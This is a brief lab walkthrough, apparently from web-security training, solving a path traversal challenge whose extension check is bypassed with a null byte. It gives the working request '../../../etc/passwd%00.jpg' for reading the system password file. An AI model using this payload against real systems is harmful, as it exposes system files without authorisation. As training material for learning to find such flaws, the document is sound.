# File path traversal, validation of file extension with null byte bypass

## This lab contains a [file path traversal] vulnerability in the display of product images.

## The application validates that the supplied filename ends with the expected file extension.

## To solve the lab, retrieve the contents of the `/etc/passwd` file.

### Note: =========> Null Byte Injection is an active exploitation technique used to bypass sanity checking filters in web infrastructure by adding URL-encoded null byte characters (i.e. %00, or 0x00 in hex) to the user-supplied data.

---

### step 1

GET /image?filename=21.jpg HTTP/1.1

### step2

GET /image?filename=../../../etc/passwd%00.jpg HTTP/1.1
